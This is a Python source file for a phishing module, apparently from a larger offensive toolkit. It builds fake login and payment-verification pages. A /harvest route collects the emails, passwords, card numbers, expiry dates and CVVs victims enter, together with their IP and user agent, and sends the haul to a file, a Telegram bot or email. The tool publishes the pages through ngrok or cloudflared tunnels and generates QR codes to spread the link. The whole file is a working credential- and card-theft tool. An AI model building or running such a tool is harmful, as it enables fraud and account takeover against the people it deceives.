#!/usr/bin/env python3

import os
import json
import shutil
import datetime
import smtplib
import requests
import subprocess
import qrcode
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, render_template_string, redirect, render_template
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
import threading
import webbrowser
import time
import socket
import select
from PIL import Image, ImageDraw, ImageFont
import re

console = Console()

class LandingPageCreator:
    def __init__(self):
        self.app = Flask(__name__, 
                        template_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates'))
        self.templates_dir = 'templates/landing'
        self.output_dir = 'output/harvested'
        self.qr_dir = 'output/qrcodes'  # New directory for QR codes
        self.harvested_data = []
        self.settings = {
            'output_method': 'file',  # 'file', 'telegram', 'email'
            'telegram_bot_token': '',
            'telegram_chat_id': '',
            'email_smtp_server': '',
            'email_smtp_port': 587,
            'email_address': '',
            'email_password': '',
            'notification_email': '',
            'output_file': os.path.join('output', 'harvested', 'credentials.txt'),
            'ngrok_token': '',  # Added ngrok token to settings
        }
        self._ensure_directories()
        self.setup_routes()
        self.load_settings()
        self.cloudflared_process = None
        self.ngrok_process = None

    def _ensure_directories(self):
        """Ensure all required directories exist."""
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.qr_dir, exist_ok=True)  # Create QR codes directory
        self._create_default_templates()

    def _create_default_templates(self):
        """Create default landing page templates if they don't exist."""
        modern_login = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        :root {
            --primary-color: #2563eb;
            --secondary-color: #1d4ed8;
            --background-color: #f8fafc;
            --text-color: #1e293b;
            --error-color: #ef4444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: var(--background-color);
            color: var(--text-color);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1rem;
        }

        .login-container {
            background: white;
            padding: 2rem;
            border-radius: 1rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }

        .logo {
            text-align: center;
            margin-bottom: 2rem;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid #e2e8f0;
            border-radius: 0.5rem;
            font-size: 1rem;
            transition: border-color 0.2s;
        }

        input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }

        button {
            width: 100%;
            padding: 0.75rem 1rem;
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 0.5rem;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        button:hover {
            background: var(--secondary-color);
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h2>Secure Login</h2>
        </div>
        <form action="/harvest" method="POST" id="loginForm">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>'''

        payment_verification = r'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Verification</title>
    <style>
        :root {
            --primary-color: #10b981;
            --secondary-color: #059669;
            --background-color: #f9fafb;
            --text-color: #1f2937;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: var(--background-color);
            color: var(--text-color);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1rem;
        }

        .payment-container {
            background: white;
            padding: 2rem;
            border-radius: 1rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 480px;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .amount {
            text-align: center;
            font-size: 2.5rem;
            font-weight: 600;
            color: var(--primary-color);
            margin: 2rem 0;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid #e5e7eb;
            border-radius: 0.5rem;
            font-size: 1rem;
        }

        .card-grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 1rem;
        }

        button {
            width: 100%;
            padding: 0.75rem 1rem;
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 0.5rem;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            margin-top: 1rem;
        }

        button:hover {
            background: var(--secondary-color);
        }
    </style>
</head>
<body>
    <div class="payment-container">
        <div class="header">
            <h2>Payment Verification Required</h2>
            <p>Please verify your payment method to complete the transaction</p>
        </div>
        
        <div class="amount">$299.99</div>
        
        <form action="/harvest" method="POST" id="paymentForm">
            <div class="form-group">
                <label for="cardName">Cardholder Name</label>
                <input type="text" id="cardName" name="cardName" required>
            </div>
            
            <div class="form-group">
                <label for="cardNumber">Card Number</label>
                <input type="text" id="cardNumber" name="cardNumber" required maxlength="19" placeholder="1234 5678 9012 3456">
            </div>
            
            <div class="card-grid">
                <div class="form-group">
                    <label for="expiry">Expiry Date</label>
                    <input type="text" id="expiry" name="expiry" required placeholder="MM/YY">
                </div>
                
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" name="cvv" required maxlength="4" placeholder="123">
                </div>
            </div>
            
            <button type="submit">Verify Payment</button>
        </form>
    </div>

    <script>
        // Format card number with spaces
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
        });

        // Format expiry date
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });
    </script>
</body>
</html>'''

        templates = {
            'modern_login.html': modern_login,
            'payment_verification.html': payment_verification
        }
        
        for template_name, content in templates.items():
            target_path = os.path.join(self.templates_dir, template_name)
            if not os.path.exists(target_path):
                try:
                    with open(target_path, 'w') as f:
                        f.write(content)
                    console.print(f"[green]Created template: {template_name}[/green]")
                except Exception as e:
                    console.print(f"[red]Error creating template {template_name}: {str(e)}[/red]")

    def load_settings(self):
        """Load settings from config file."""
        config_file = os.path.join('config', 'landing_settings.json')
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.settings.update(json.load(f))
        except Exception as e:
            console.print(f"[yellow]Warning: Could not load settings: {str(e)}[/yellow]")

    def save_settings(self):
        """Save current settings to config file."""
        config_file = os.path.join('config', 'landing_settings.json')
        os.makedirs('config', exist_ok=True)
        try:
            with open(config_file, 'w') as f:
                json.dump(self.settings, f, indent=4)
            console.print("[green]Settings saved successfully![/green]")
        except Exception as e:
            console.print(f"[red]Error saving settings: {str(e)}[/red]")

    def configure_output(self):
        """Configure output settings."""
        console.print(Panel("[bold]Output Configuration[/bold]"))
        
        output_method = Prompt.ask(
            "Select output method",
            choices=["file", "telegram", "email"],
            default=self.settings['output_method']
        )
        
        self.settings['output_method'] = output_method
        
        if output_method == "telegram":
            self.settings['telegram_bot_token'] = Prompt.ask("Enter Telegram Bot Token")
            self.settings['telegram_chat_id'] = Prompt.ask("Enter Telegram Chat ID")
        
        elif output_method == "email":
            self.settings['email_smtp_server'] = Prompt.ask("Enter SMTP Server")
            self.settings['email_smtp_port'] = int(Prompt.ask("Enter SMTP Port", default="587"))
            self.settings['email_address'] = Prompt.ask("Enter Email Address")
            self.settings['email_password'] = Prompt.ask("Enter Email Password", password=True)
            self.settings['notification_email'] = Prompt.ask("Enter Notification Email")
        
        elif output_method == "file":
            self.settings['output_file'] = Prompt.ask(
                "Enter output file path",
                default=self.settings['output_file']
            )
        
        self.save_settings()

    def send_to_telegram(self, message):
        """Send message to Telegram."""
        try:
            url = f"https://api.telegram.org/bot{self.settings['telegram_bot_token']}/sendMessage"
            data = {
                "chat_id": self.settings['telegram_chat_id'],
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=data)
            if response.status_code != 200:
                raise Exception(f"Failed to send message: {response.text}")
        except Exception as e:
            console.print(f"[red]Error sending to Telegram: {str(e)}[/red]")

    def send_email_notification(self, subject, body):
        """Send email notification."""
        try:
            msg = MIMEMultipart()
            msg['Subject'] = subject
            msg['From'] = self.settings['email_address']
            msg['To'] = self.settings['notification_email']
            msg.attach(MIMEText(body, 'plain'))

            with smtplib.SMTP(self.settings['email_smtp_server'], self.settings['email_smtp_port']) as server:
                server.starttls()
                server.login(self.settings['email_address'], self.settings['email_password'])
                server.send_message(msg)
        except Exception as e:
            console.print(f"[red]Error sending email: {str(e)}[/red]")

    def save_to_file(self, data):
        """Save data to file."""
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.settings['output_file'], 'a') as f:
                f.write(f"\n[{timestamp}] New Credentials:\n")
                f.write(json.dumps(data, indent=2))
                f.write("\n" + "="*50 + "\n")
        except Exception as e:
            console.print(f"[red]Error saving to file: {str(e)}[/red]")

    def process_harvested_data(self, data):
        """Process and store harvested data based on settings."""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        
        harvested_info = {
            'timestamp': timestamp,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'data': data
        }
        
        self.harvested_data.append(harvested_info)
        
        # Format message for notifications
        message = f"""
New credentials harvested!
Timestamp: {timestamp}
IP Address: {ip_address}
User Agent: {user_agent}
Data:
{json.dumps(data, indent=2)}
"""
        
        # Handle output based on settings
        if self.settings['output_method'] == 'telegram':
            self.send_to_telegram(message)
        elif self.settings['output_method'] == 'email':
            self.send_email_notification("New Credentials Harvested", message)
        else:  # file output
            self.save_to_file(harvested_info)

    def setup_routes(self):
        """Set up Flask routes for the landing pages."""
        @self.app.route('/')
        def index():
            template_name = request.args.get('template', 'modern_login.html')
            try:
                return render_template(f'landing/{template_name}')
            except Exception as e:
                console.print(f"[red]Error loading template: {str(e)}[/red]")
                return "Template not found", 404

        @self.app.route('/harvest', methods=['POST'])
        def harvest():
            data = request.get_json() if request.is_json else dict(request.form)
            self.process_harvested_data(data)
            console.print("[green]Credentials harvested successfully![/green]")
            return redirect(request.args.get('redirect_url', 'https://google.com'))

    def generate_qr_code(self, url, name="phishing"):
        """Generate and save QR code for a URL."""
        # Create QR code with better error correction and size
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=2,
        )
        qr.add_data(url)
        qr.make(fit=True)

        # Create QR code image
        qr_image = qr.make_image(fill_color="black", back_color="white")

        # Save the QR code
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = os.path.join(self.qr_dir, f'{name}_qr_{timestamp}.png')
        qr_image.save(output_path, quality=95)

        # Display QR in console
        console.print("\n[bold white]Scan this QR code to access the page:[/bold white]")
        
        # Create console version of QR code
        console_qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=1,
            border=1,
        )
        console_qr.add_data(url)
        console_qr.make(fit=True)
        console_qr.print_ascii(invert=True)  # White QR code on console
        
        console.print(f"[green]QR code saved as: {output_path}[/green]")
        return output_path

    def start_cloudflared(self, port, localhost_url):
        """Start cloudflared tunnel."""
        try:
            # Check if cloudflared is already running
            ps_output = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            if 'cloudflared tunnel' in ps_output.stdout:
                console.print("[yellow]Cloudflared tunnel is already running. Using existing tunnel...[/yellow]")
                # Try to get the existing tunnel URL
                try:
                    curl_output = subprocess.run(['curl', 'localhost:4040/api/tunnels'], capture_output=True, text=True)
                    if curl_output.returncode == 0 and 'trycloudflare.com' in curl_output.stdout:
                        url = re.search(r'https://[^"]*\.trycloudflare\.com', curl_output.stdout).group(0)
                        console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                        console.print(f"[bold green]Using existing tunnel URL: {url}[/bold green]")
                        console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                        return True
                except Exception:
                    pass
            
            # If we couldn't get the URL, kill the existing process and start fresh
            console.print("[yellow]Could not get existing tunnel URL. Starting fresh tunnel...[/yellow]")
            
            # Kill any existing cloudflared processes
            subprocess.run(['pkill', 'cloudflared'], stderr=subprocess.DEVNULL)
            time.sleep(1)  # Wait for processes to be killed
            
            console.print("[yellow]Starting cloudflared tunnel...[/yellow]")
            
            # First check if cloudflared is installed and working
            try:
                version_check = subprocess.run(['cloudflared', '--version'], 
                                            capture_output=True, 
                                            text=True)
                console.print(f"[green]Cloudflared version: {version_check.stdout.strip()}[/green]")
            except Exception as e:
                console.print(f"[red]Error checking cloudflared version: {str(e)}[/red]")
            
            # Start cloudflared tunnel with more detailed output
            process = subprocess.Popen(
                [
                    'cloudflared', 'tunnel',
                    '--url', localhost_url,
                    '--metrics', '127.0.0.1:0',  # Use random port for metrics
                    '--no-autoupdate',  # Prevent auto updates during tunnel creation
                    '--protocol', 'http2'  # Use HTTP2 for better stability
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1
            )
            
            # Wait for the public URL with timeout
            start_time = time.time()
            timeout = 60  # 60 seconds timeout
            url_found = False
            output_buffer = []
            
            console.print("[yellow]Waiting for tunnel to be established...[/yellow]")
            
            while (time.time() - start_time) < timeout and not url_found:
                # Check if process is still running
                if process.poll() is not None:
                    console.print("[red]Cloudflared process terminated unexpectedly[/red]")
                    # Show the last error message if available
                    if process.stderr:
                        error = process.stderr.readline().strip()
                        if error:
                            console.print(f"[red]Last error: {error}[/red]")
                    break
                
                # Read from stdout and stderr
                try:
                    # Check stderr first for any errors
                    if process.stderr in select.select([process.stderr], [], [], 0)[0]:
                        error = process.stderr.readline().strip()
                        if error:
                            console.print(f"[yellow]Cloudflared message: {error}[/yellow]")
                    
                    # Then check stdout for the URL
                    if process.stdout in select.select([process.stdout], [], [], 0)[0]:
                        line = process.stdout.readline().strip()
                        if line:
                            output_buffer.append(line)
                            console.print(f"[dim]{line}[/dim]")
                            
                            # Look for tunnel URL in the output
                            if "trycloudflare.com" in line:
                                words = line.split()
                                for word in words:
                                    if 'trycloudflare.com' in word:
                                        url = word.strip()
                                        # Clean up the URL
                                        url = url.strip('|').strip()
                                        if not url.startswith('http'):
                                            url = 'https://' + url
                                        console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                                        console.print(f"[bold green]Public URL: {url}[/bold green]")
                                        console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                                        
                                        # Generate QR code for the URL
                                        self.generate_qr_code(url, "cloudflared")
                                        
                                        self.cloudflared_process = process
                                        url_found = True
                                        return True
                            
                            # Alternative URL format detection
                            if "Your quick Tunnel has been created!" in line:
                                # Read the next few lines to find the URL
                                for _ in range(5):  # Check next 5 lines
                                    url_line = process.stdout.readline().strip()
                                    if url_line:
                                        output_buffer.append(url_line)
                                        console.print(f"[dim]{url_line}[/dim]")
                                        if 'trycloudflare.com' in url_line:
                                            words = url_line.split()
                                            for word in words:
                                                if 'trycloudflare.com' in word:
                                                    url = word.strip()
                                                    if not url.startswith('http'):
                                                        url = 'https://' + url
                                                    console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                                                    console.print(f"[bold green]Public URL: {url}[/bold green]")
                                                    console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                                                    self.cloudflared_process = process
                                                    url_found = True
                                                    return True
                except Exception as e:
                    console.print(f"[red]Error reading cloudflared output: {str(e)}[/red]")
                
                time.sleep(0.1)
            
            # If we get here, we didn't find the URL
            console.print("[red]Failed to establish cloudflared tunnel. Debug information:[/red]")
            console.print("[yellow]Last few lines of output:[/yellow]")
            for line in output_buffer[-5:]:  # Show last 5 lines
                console.print(f"[dim]{line}[/dim]")
            
            if process.poll() is None:
                process.terminate()
            return False
            
        except FileNotFoundError:
            console.print("[red]Error: cloudflared not found. Installing now...[/red]")
            try:
                # Download and install cloudflared
                subprocess.run([
                    'curl', '-L', '--output', 'cloudflared.deb',
                    'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb'
                ], check=True)
                subprocess.run(['sudo', 'dpkg', '-i', 'cloudflared.deb'], check=True)
                subprocess.run(['rm', 'cloudflared.deb'], check=True)
                console.print("[green]Cloudflared installed successfully. Please try again.[/green]")
                return False
            except Exception as e:
                console.print(f"[red]Failed to install cloudflared: {str(e)}[/red]")
                return False
        except Exception as e:
            console.print(f"[red]Error starting cloudflared: {str(e)}[/red]")
            return False

    def stop_cloudflared(self):
        """Stop cloudflared tunnel."""
        if self.cloudflared_process:
            self.cloudflared_process.terminate()
            self.cloudflared_process = None
            console.print("[yellow]Cloudflared tunnel stopped.[/yellow]")

    def start_ngrok(self, port):
        """Start ngrok tunnel."""
        try:
            console.print("[yellow]Starting ngrok tunnel...[/yellow]")
            
            # Check for ngrok auth token in settings first
            if not self.settings.get('ngrok_token'):
                auth_token = Prompt.ask("Enter your ngrok auth token (get it from https://dashboard.ngrok.com)")
                self.settings['ngrok_token'] = auth_token
                self.save_settings()
            
            # Configure ngrok with the token
            subprocess.run(['ngrok', 'config', 'add-authtoken', self.settings['ngrok_token']], 
                         check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Start ngrok tunnel
            process = subprocess.Popen(
                [
                    'ngrok', 'http',
                    '--log=stdout',
                    '--request-header-add=ngrok-skip-browser-warning:true',
                    str(port)
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1
            )
            
            # Wait for ngrok to start and get URL
            max_attempts = 30
            attempt = 0
            url_found = False
            
            while attempt < max_attempts and not url_found:
                try:
                    # Try to get URL from ngrok API
                    response = requests.get('http://127.0.0.1:4040/api/tunnels')
                    if response.status_code == 200:
                        tunnels = response.json()['tunnels']
                        if tunnels:
                            url = tunnels[0]['public_url']
                            console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                            console.print(f"[bold green]Public URL: {url}[/bold green]")
                            console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                            
                            # Generate QR code for the URL
                            self.generate_qr_code(url, "ngrok")
                            
                            self.ngrok_process = process
                            return True
                except:
                    attempt += 1
                    time.sleep(1)
                    continue
            
            if process.poll() is None:
                process.terminate()
            return False
            
        except FileNotFoundError:
            console.print("[yellow]Installing ngrok...[/yellow]")
            try:
                # Download and install ngrok (suppress output)
                subprocess.run([
                    'curl', '-L', '--output', 'ngrok.tgz',
                    'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz'
                ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['tar', 'xvzf', 'ngrok.tgz'], check=True, stdout=subprocess.DEVNULL)
                subprocess.run(['sudo', 'mv', 'ngrok', '/usr/local/bin/'], check=True, stdout=subprocess.DEVNULL)
                subprocess.run(['rm', 'ngrok.tgz'], check=True, stdout=subprocess.DEVNULL)
                return False
            except:
                return False
        except:
            return False

    def stop_ngrok(self):
        """Stop ngrok tunnel."""
        if hasattr(self, 'ngrok_process') and self.ngrok_process:
            self.ngrok_process.terminate()
            self.ngrok_process = None
            console.print("[yellow]ngrok tunnel stopped.[/yellow]")

    def start_server(self, host='0.0.0.0', port=8080):
        """Start the Flask server."""
        try:
            # First check if the port is available
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((host, port))
                s.close()
            
            # Start the server
            console.print(f"[green]Starting server on {host}:{port}...[/green]")
            self.app.run(host=host, port=port, debug=False)
        except OSError as e:
            console.print(f"[red]Port {port} is already in use. Please try a different port.[/red]")
            raise e
        except Exception as e:
            console.print(f"[red]Failed to start server: {str(e)}[/red]")
            raise e

    def _wait_for_server(self, port, timeout=10):
        """Wait for server to be ready and return server URLs."""
        start_time = time.time()
        server_urls = []
        
        while time.time() - start_time < timeout:
            try:
                # Get all network interfaces
                addrs = socket.getaddrinfo(socket.gethostname(), port)
                for addr in addrs:
                    ip = addr[4][0]
                    url = f"http://{ip}:{port}"
                    if url not in server_urls:
                        server_urls.append(url)
                
                # Always include localhost
                localhost_url = f"http://127.0.0.1:{port}"
                if localhost_url not in server_urls:
                    server_urls.append(localhost_url)
                
                # Try connecting to verify server is running
                response = requests.get(localhost_url)
                return server_urls
                
            except (socket.gaierror, requests.exceptions.ConnectionError):
                time.sleep(0.5)
                continue
        
        return []

    def view_harvested_data(self):
        """Display harvested credentials."""
        if not self.harvested_data:
            console.print("[yellow]No credentials harvested yet.[/yellow]")
            return

        console.print("\n[bold]Harvested Credentials:[/bold]")
        for i, data in enumerate(self.harvested_data, 1):
            console.print(f"\nEntry {i}:")
            for key, value in data.items():
                console.print(f"  {key}: {value}")

    def _find_available_port(self, start_port=8080, max_attempts=100):
        """Find an available port starting from start_port."""
        for port in range(start_port, start_port + max_attempts):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                try:
                    s.bind(('', port))
                    return port
                except OSError:
                    continue
        raise RuntimeError(f"Could not find an available port after {max_attempts} attempts")

    def run(self):
        """Main method to run the landing page creator module."""
        console.print(Panel("[bold red]Landing Page Creator Module[/bold red]"))

        while True:
            console.print("\n1. Start Phishing Server")
            console.print("2. View Harvested Credentials")
            console.print("3. Configure Output Settings")
            console.print("4. View Available Templates")
            console.print("5. Back to Main Menu")

            choice = Prompt.ask("Select an option", choices=["1", "2", "3", "4", "5"])

            if choice == "1":
                # Kill any existing processes
                subprocess.run(['pkill', 'cloudflared'], stderr=subprocess.DEVNULL)
                subprocess.run(['pkill', 'ngrok'], stderr=subprocess.DEVNULL)
                time.sleep(1)  # Wait for processes to be killed
                
                # Find an available port
                try:
                    port = self._find_available_port()
                    console.print(f"[green]Found available port: {port}[/green]")
                except RuntimeError as e:
                    console.print(f"[red]Error: {str(e)}[/red]")
                    continue

                # Start the Flask server first
                console.print(f"\n[green]Starting local server on port {port}...[/green]")
                server_thread = threading.Thread(
                    target=self.start_server,
                    kwargs={'port': port}
                )
                server_thread.daemon = True
                server_thread.start()

                # Wait for the server to start and get URLs
                server_urls = self._wait_for_server(port)
                if not server_urls:
                    console.print("[red]Failed to start server. Please check for errors.[/red]")
                    continue

                # Display server URLs
                console.print(f"[green]Server is running at:[/green]")
                for url in server_urls:
                    console.print(f"[yellow]- {url}[/yellow]")
                
                console.print("\nSelect tunneling service:")
                console.print("1. Ngrok")
                console.print("2. Cloudflared")
                console.print("3. None")
                
                tunnel_choice = Prompt.ask(
                    "Enter your choice",
                    choices=["1", "2", "3"],
                    default="1"
                )
                
                if tunnel_choice == "1":  # Ngrok
                    # Start ngrok tunnel
                    if not self.start_ngrok(port):
                        console.print("[yellow]Continuing with local server only.[/yellow]")
                
                elif tunnel_choice == "2":  # Cloudflared
                    # Start cloudflared with increased timeout
                    cloudflared_success = False
                    max_retries = 3
                    
                    # Use localhost URL for cloudflared
                    localhost_url = f"http://127.0.0.1:{port}"
                    
                    for attempt in range(max_retries):
                        if attempt > 0:
                            console.print(f"[yellow]Retrying tunnel creation (attempt {attempt + 1}/{max_retries})...[/yellow]")
                            time.sleep(2)
                        
                        if self.start_cloudflared(port, localhost_url):
                            cloudflared_success = True
                            break
                    
                    if not cloudflared_success:
                        console.print("[red]Failed to create tunnel after multiple attempts.[/red]")
                        console.print("[yellow]Continuing with local server only.[/yellow]")

                # Keep the main thread alive and handle interrupts
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    console.print("\n[yellow]Stopping server...[/yellow]")
                    self.stop_cloudflared()
                    self.stop_ngrok()
                    break

            elif choice == "2":
                self.view_harvested_data()

            elif choice == "3":
                self.configure_output()

            elif choice == "4":
                templates = os.listdir(self.templates_dir)
                console.print("\nAvailable Templates:")
                for template in templates:
                    console.print(f"- {template}")

            elif choice == "5":
                self.stop_cloudflared()
                self.stop_ngrok()
                break 